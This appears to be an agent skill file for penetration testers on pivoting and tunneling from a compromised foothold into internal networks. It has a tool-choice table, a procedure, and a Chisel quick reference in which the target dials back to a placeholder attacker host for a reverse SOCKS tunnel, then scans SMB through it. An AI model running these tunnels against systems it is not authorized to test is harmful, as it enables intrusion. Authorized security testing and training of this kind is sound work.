---
name: pivoting
description: Choose and set up pivots and tunnels - Chisel, ligolo-ng, proxychains, SSH tunnels, socat - to reach internal networks from a foothold. Use when a foothold sees networks the attacker cannot.
---

# Pivoting & Tunneling

## Choose the right primitive
| Need | Tool |
|---|---|
| Single port to a tool that needs localhost (RDP, web app) | `ssh -L` / `chisel` single forward / `socat` |
| Full network access for many tools | ligolo-ng (VPN-style) or `chisel` multi-forward |
| Route one command through the pivot | `proxychains4 <cmd>` (after ligolo/SOCKS is up) |
| Dynamic SOCKS from an SSH-capable host | `ssh -D 1080` |
| Relay/redirect on the pivot host itself | `socat TCP-LISTEN:...,fork TCP:...` |

## Procedure
1. From the foothold, enumerate what IT can reach: local listeners, adjacent
   subnets, DC/RDP/DB ports that time out from you but answer locally.
2. Confirm the pivot client can dial back to you (firewall/NAT direction!)
   before building the tunnel.
3. Bring up the tunnel, then **verify from the attacker side** (nmap one
   known-open and one known-closed port through it) before trusting scans.
4. Prefer ligolo/proxychains for scanner-heavy work; prefer explicit
   forwards for single services (more stable, less blast radius).

## Chisel quick reference
```bash
# attacker
chisel server -p 8080 --reverse
# target
chisel client <ATTACKER>:8080 R:socks
# then: proxychains4 nxc smb <internal-target> ...
```

## Gotchas
- Route the DC's IP explicitly through the tunnel if your OS has a direct
  route to the range that shadows it.
- Kerberos/LDAP through a pivot needs name resolution on the attacker side --
  add the hostname->internal-IP mapping locally, don't scan by IP and wonder
  why Kerberos fails.
- Keep one clean tunnel per purpose; a flaky multi-purpose tunnel makes every
  tool look broken.
- NAT forwards 80, 443, 445, 4444-4460, 8080-8090 to the container.
  Use 8080-8090 for chisel/ligolo tunnels.
